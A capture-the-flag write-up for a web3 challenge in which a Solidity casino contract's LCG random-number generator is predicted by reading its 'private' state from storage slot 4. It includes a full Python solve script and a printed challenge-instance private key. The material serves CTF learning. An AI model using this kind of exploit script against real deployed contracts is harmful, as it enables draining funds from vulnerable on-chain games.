# Mafia at the End of the Block 2

This web3 challenge provide us two files:

**Casino.sol:**
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

contract CasinoPWNME {

  bool public isWinner;

	uint256 public multiplier = 14130161972673258133;
	uint256 public increment = 11367173177704995300;
	uint256 public modulus = 4701930664760306055;
  uint private state;

  constructor (){
    state = block.prevrandao % modulus;
  }

  function checkWin() public view returns (bool) {
    return isWinner;
  }

  function playCasino(uint number) public payable  {

    require(msg.value >= 0.1 ether, "My brother in christ, it's pay to lose not free to play !");
    PRNG();
    if (number == state){
      isWinner = true;
    } else {
      isWinner = false;
    }
  }
  
  function PRNG() private{
    state = (multiplier * state + increment) % modulus;
  }

}
```

**Setup.sol:**
```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {CasinoPWNME} from "./Casino.sol";

contract Setup {

    CasinoPWNME public casino;

    constructor() {
        casino = new CasinoPWNME();
    }

    function isSolved() public view returns (bool) {
        return casino.checkWin();
    }
    
}
```

Our goal is to win at a "casino" smart contract by predicting it's PRNG. But, before any interaction with the casino, we need to solve a proof-of-work (PoW). 
Then, we will get parameters that include the addresses and keys needed to interact with the deployed contracts.

To solve the PoW, we need to find a specific input that, when combined with a given prefix and hashed using SHA256, results in a hash value that meets a certain difficulty level (in this case, starting with a certain number of zeros).
To do it, we can just bruteforce the solution:

```py
def solve_pow(prefix, target_bits):
    target = 2 ** (256 - target_bits)
    for i in range(100000000):
        candidate = str(i).encode()
        digest = hashlib.sha256(prefix + candidate).hexdigest()
        if int(digest, 16) < target:
            return candidate
    raise Exception("PoW not found")
```


Once we solved the Proof-of-Work, the server sends the instance information:
```
[*] Received instance info
[*] Setup Address: 0xa13cf13ab19c0D418481360bE2667A8574435019
[*] RPC URL: https://mafia2.phreaks.fr/40ad4c81-b2a2-46c2-9c94-8da278f3ed5d
[*] Private Key: 0xa1a036976751622cc1a4037cf81c70bd5bf1c7d00b970679999cc8eb5819a395
[*] Player Address: 0x7682c05D4852AB5102eC0D78fec4E9047a243b8E
[*] Casino Address: 0xE02ccBb7c7A1F349798018E49293950D871ec45F
```

Once we have access to the instance, we need to predict the casino's PRNG to win the game.

Looking at the **Casino.sol** contract, we can see that the PRNG is a simple LCG and we have we have almost all the required information to predict it:

```js
uint256 public multiplier = 14130161972673258133;
uint256 public increment = 11367173177704995300;
uint256 public modulus = 4701930664760306055;
uint private state;

constructor (){
    state = block.prevrandao % modulus;
}

...

function PRNG() private{
    state = (multiplier * state + increment) % modulus;
}
```
The only issue is that we don't have the initial state. However, in Solidity, state variables are laid out in storage slots sequentially.
Wich means that for our CasinoPWNME contract, state is stored in storage slot 4 (slot 0 for isWinner, 1 for multiplier, 2 for increment, 3 for modulus, and 4 for state).

So we can easilly retrieve it with this code:

```py
current_state_hex = w3.eth.get_storage_at(casino_addr, 4)
current_state = int(current_state_hex.hex(), 16)
log.info(f"Current state: {current_state}")
```

## solve.py

```py
from pwn import *
from web3 import Web3, Account
import hashlib, requests, re

def solve_pow(prefix, target_bits):
    target = 2 ** (256 - target_bits)
    for i in range(100000000):
        candidate = str(i).encode()
        digest = hashlib.sha256(prefix + candidate).hexdigest()
        if int(digest, 16) < target:
            return candidate
    raise Exception("PoW not found")

def find_deployment_block(w3, setup_address):
    setup_address = Web3.to_checksum_address(setup_address)
    current_block = w3.eth.block_number
    for block_num in range(current_block, 0, -1):
        block = w3.eth.get_block(block_num, full_transactions=True)
        for tx in block.transactions:
            if tx['to'] is None:
                receipt = w3.eth.get_transaction_receipt(tx['hash'])
                if receipt['contractAddress'] == setup_address:
                    return receipt['blockNumber']
    raise ValueError("Deployment block not found")

io = remote("mafia2.phreaks.fr", 10020)
io.sendlineafter(b"action? ", b"1")
pow_data = io.recvuntil(b"YOUR_INPUT =").decode()
log.info("Received POW challenge")

prefix_match = re.search(r'sha256\("([0-9a-f]+)"', pow_data)
difficulty_match = re.search(r'start with (\d+) zeros', pow_data)
if not prefix_match or not difficulty_match:
    log.error("Failed to extract POW parameters")
    exit(1)
prefix = prefix_match.group(1).encode()
difficulty = int(difficulty_match.group(1))
log.info(f"Solving POW with prefix={prefix.decode()}, difficulty={difficulty}")

solution = solve_pow(prefix, difficulty)
log.success(f"Found POW solution: {solution.decode()}")
io.sendline(solution)
log.info("Sent POW solution")

instance_info_bytes = io.recvall()
instance_info_decoded = instance_info_bytes.decode()
log.info("Received instance info")

setup_match = re.search(r"SETUP=(0x[0-9a-fA-F]+)", instance_info_decoded)
rpc_match = re.search(r"RPC=(https?://[^\s]+)", instance_info_decoded)
private_key_match = re.search(r"PRIVATE_KEY=(0x[0-9a-fA-F]+)", instance_info_decoded)
player_addr_match = re.search(r"PLAYER=(0x[0-9a-fA-F]+)", instance_info_decoded)

if not (setup_match and rpc_match and private_key_match and player_addr_match):
    log.error("Failed to extract instance parameters")
    exit(1)

setup_addr = setup_match.group(1)
rpc_url = rpc_match.group(1)
private_key = private_key_match.group(1)
player_addr = player_addr_match.group(1)

log.info(f"Setup Address: {setup_addr}")
log.info(f"RPC URL: {rpc_url}")
log.info(f"Private Key: {private_key}")
log.info(f"Player Address: {player_addr}")

casino_abi = [
    {"inputs": [{"internalType": "uint256", "name": "number", "type": "uint256"}],
     "name": "playCasino", "outputs": [], "stateMutability": "payable", "type": "function"},
    {"inputs": [], "name": "checkWin", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "modulus", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "multiplier", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
     "stateMutability": "view", "type": "function"},
    {"inputs": [], "name": "increment", "outputs": [{"internalType": "uint256", "name": "", "type": "uint256"}],
     "stateMutability": "view", "type": "function"}
]
setup_abi = [
    {"constant": True, "inputs": [], "name": "casino", "outputs": [{"internalType": "contract CasinoPWNME", "name": "", "type": "address"}],
     "payable": False, "stateMutability": "view", "type": "function"},
    {"constant": True, "inputs": [], "name": "isSolved", "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
     "payable": False, "stateMutability": "view", "type": "function"}
]

w3 = Web3(Web3.HTTPProvider(rpc_url))
assert w3.is_connected(), "Failed to connect to RPC"

setup_contract = w3.eth.contract(address=setup_addr, abi=setup_abi)
casino_addr = setup_contract.functions.casino().call()
log.info(f"Casino Address: {casino_addr}")

casino_contract = w3.eth.contract(address=casino_addr, abi=casino_abi)
account = Account.from_key(private_key)
nonce = w3.eth.get_transaction_count(account.address)

modulus = casino_contract.functions.modulus().call()
multiplier = casino_contract.functions.multiplier().call()
increment = casino_contract.functions.increment().call()
log.info(f"modulus: {modulus}, multiplier: {multiplier}, increment: {increment}")

current_state_hex = w3.eth.get_storage_at(casino_addr, 4)
current_state = int(current_state_hex.hex(), 16)
log.info(f"Current state: {current_state}")

next_state = (multiplier * current_state + increment) % modulus
log.info(f"Predicted next state: {next_state}")

nonce = w3.eth.get_transaction_count(account.address)
play_tx = casino_contract.functions.playCasino(next_state).build_transaction({
    'from': account.address,
    'value': 10**17,  # 0.1 ether
    'nonce': nonce,
    'gasPrice': w3.eth.gas_price,
    'gas': 100000
})

signed_play_tx = account.sign_transaction(play_tx)
try:
    tx_hash = w3.eth.send_raw_transaction(signed_play_tx.raw_transaction)
    log.info(f"Transaction sent: {tx_hash.hex()}")

    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
    log.info(f"Transaction receipt: {tx_receipt}")

    is_solved = setup_contract.functions.isSolved().call()
    if is_solved:
        log.success("Challenge solved!")

        # Extract base URL from rpc_url
        base_url_match = re.match(r"(https?://.*?:\d+)/.*", rpc_url)
        if base_url_match:
            base_url = base_url_match.group(1)
            vip_room_url = f"{base_url}/{rpc_url.split('/')[-1]}/vip.html"
            log.info(f"VIP Room URL: {vip_room_url}")

            # Fetch VIP room content
            response = requests.get(vip_room_url)
            if response.status_code == 200:
                flag_match = re.search(r"PWNME\{[^\}]+\}", response.text)
                if flag_match:
                    flag = flag_match.group(0)
                    log.success(f"Flag: {flag}")
                else:
                    log.error("Flag not found in VIP room content")
            else:
                log.error(f"Failed to access VIP room. Status code: {response.status_code}")
        else:
            log.error("Failed to extract base URL from RPC URL")
    else:
        log.error("Failed to solve the challenge.")

except Exception as e:
    log.error(f"Transaction failed: {e}")
```
